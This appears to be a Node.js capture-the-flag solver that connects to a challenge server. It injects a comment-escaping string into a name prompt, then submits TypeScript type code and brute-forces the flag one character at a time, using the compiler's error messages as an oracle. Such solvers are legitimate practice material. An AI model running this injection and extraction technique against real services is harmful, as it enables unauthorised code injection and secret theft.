let current = "";
function tryConnectionWithChar(a){
    var net = require('net');
    var client = new net.Socket();
    client.connect(13381, 'chall.pwnoh.io', function() {
        //console.log('Connected');
    });

    client.on('data', function(data) {
        //console.log('Received: ' + data);
        if(data.includes("What is your name?")){
            client.write("*/ let a: CTF=`");
        }
        if(data.includes("Give me some code")){
            client.write('`;type CTF =`${string}bctf{'+a+'${string}}${string}`');
            client.write("\n");
        }
        if(data.includes("Congrats, your code is perfect")){
            current = a;
            client.destroy();
        } else if(data.includes("is not assignable")){
            client.destroy();
        }
    });

    client.on('close', function() {
        //console.log('Connection closed');
    });
}
let alpha = "abcdefghijklmnopqrstuvwxyz0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+=-[]{};".split("");
let i = 0;
let length = 0;
setInterval(function(){
    console.log(current+alpha[i]);
    tryConnectionWithChar(current+alpha[i]);
    i++;
    if(current.length > length){
        i = 0;
        length = current.length;
    }
    if(i==alpha.length){
        i=0;
    }
},200);